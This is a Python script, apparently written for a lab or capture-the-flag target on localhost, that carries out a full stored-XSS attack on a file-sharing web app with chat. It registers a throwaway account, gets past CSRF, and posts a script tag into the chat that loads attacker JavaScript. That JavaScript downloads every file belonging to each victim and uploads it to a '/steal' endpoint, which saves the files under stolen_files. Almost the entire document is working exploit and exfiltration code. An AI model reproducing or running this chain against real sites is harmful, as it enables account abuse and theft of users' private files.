from flask import Flask, request, Response
import os
import threading
import time
import requests
from bs4 import BeautifulSoup
import socketio
import random
import string

app = Flask(__name__)
is_active = True

@app.after_request
def add_cors_headers(response):
    if is_active:
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        response.headers['Access-Control-Allow-Methods'] = 'POST, GET, OPTIONS'
    return response

@app.route('/steal', methods=['POST', 'OPTIONS'])
def steal_file():
    if not is_active:
        return 'Server inactive', 503
    
    if request.method == 'OPTIONS':
        return Response(status=200)
    
    if 'file' not in request.files:
        return 'No file', 400
    
    file = request.files['file']
    username, filename = file.filename.split('/', 1)
  
    os.makedirs(f'stolen_files/{username}', exist_ok=True)
    file.save(f'stolen_files/{username}/{filename}')
    return 'OK', 200

@app.route('/script.js')
def script_js():
    print(f"[script.js] Loaded by: {request.headers.get('User-Agent')} from {request.headers.get('Referer')}")
    if not is_active:
        return 'Server inactive', 503
    
    js_code = '''
(async () => {
    const stealEndpoint = 'http://localhost:8000/steal';
    
    try {
        // Получаем имя пользователя
        const accountResponse = await fetch('/account');
        const accountHtml = await accountResponse.text();
        const usernameMatch = accountHtml.match(/Добро пожаловать, @([^<!\s]+)/);
        if (!usernameMatch) return;
        const username = usernameMatch[1].trim();

        // Получаем список файлов
        const filesResponse = await fetch('/my_files');
        const filesHtml = await filesResponse.text();
        
        // Создаем DOM-парсер для извлечения данных
        const parser = new DOMParser();
        const doc = parser.parseFromString(filesHtml, 'text/html');
        
        // Находим все строки таблицы с файлами
        const fileRows = doc.querySelectorAll('table tbody tr');
        
        for (const row of fileRows) {
            try {
                const cells = row.querySelectorAll('td');
                if (cells.length < 3) continue;
                
                const filename = cells[0].textContent.trim(); // Получаем оригинальное имя файла
                const downloadLink = cells[2].querySelector('a[href^="/download/"]');
                if (!downloadLink) continue;
                
                const downloadUrl = downloadLink.href;
                const fileId = downloadUrl.split('/download/')[1];
                
                const downloadResponse = await fetch(downloadUrl);
                const fileBlob = await downloadResponse.blob();
                
                const formData = new FormData();
                formData.append('file', fileBlob, `${username}/${filename}`);
                
                await fetch(stealEndpoint, {
                    method: 'POST',
                    body: formData,
                    mode: 'cors'
                });
            } catch(e) {
                console.error('Error processing file:', e);
            }
        }
    } catch(e) {
        console.error('Error:', e);
    }
})();
    '''
    return Response(js_code, mimetype='application/javascript')

def generate_random_username():
    chars = string.ascii_uppercase + string.digits
    return f"xss_attacker_{''.join(random.choices(chars, k=6))}"

def generate_random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%^&*', k=12))

def get_csrf_token(session, url):
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        return soup.find('input', {'name': 'csrf_token'})['value']
    except:
        return None

def register_and_exploit():
    time.sleep(3)  # Даем время основному серверу запуститься
    target_host = "http://localhost:5000"
    attacker_host = "http://localhost:8000"
    
    with requests.Session() as s:
        # Регистрация
        username = generate_random_username()
        password = generate_random_password()
        
        # Получаем CSRF для регистрации
        csrf = get_csrf_token(s, f"{target_host}/register")
        if not csrf:
            return

        resp = s.post(f"{target_host}/register", data={
            'csrf_token': csrf,
            'username': username,
            'password': password,
            'confirm_password': password
        }, allow_redirects=False)
        
        if resp.status_code != 302:
            return

        # Авторизация
        csrf = get_csrf_token(s, f"{target_host}/login")
        if not csrf:
            return

        resp = s.post(f"{target_host}/login", data={
            'csrf_token': csrf,
            'username': username,
            'password': password
        }, allow_redirects=False)
        
        if resp.status_code != 302:
            return

        # Отправка XSS в чат через WebSocket
        sio = socketio.Client()
        try:
            sio.connect(
                target_host,
                headers={"Cookie": f"session={s.cookies.get('session')}"},
                transports=['websocket']
            )
            
            xss_payload = f'<script src="{attacker_host}/script.js"></script>'
            sio.emit('send_message', {'message': xss_payload})
            print(f"\n[+] XSS payload отправлен в чат: {xss_payload}")
            
            sio.disconnect()
        except Exception as e:
            print(f"[-] Ошибка подключения к чату: {e}")

def run_flask():
    from werkzeug.serving import make_server
    server = make_server('0.0.0.0', 8000, app)
    server.serve_forever()

if __name__ == '__main__':
    # Запуск Flask сервера в отдельном потоке
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True  # Помечаем как daemon thread
    flask_thread.start()

    # Запуск атаки в отдельном потоке
    attack_thread = threading.Thread(target=register_and_exploit)
    attack_thread.start()

    # Ждём завершения attack_thread
    attack_thread.join()

    print("[+] Сервер переведён успешно в режим прослушивания. Нажмите Ctrl+C для остановки.")
    
    try:
        # Главный поток просто ждёт
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Завершение сервера по Ctrl+C.")
        is_active = False
        
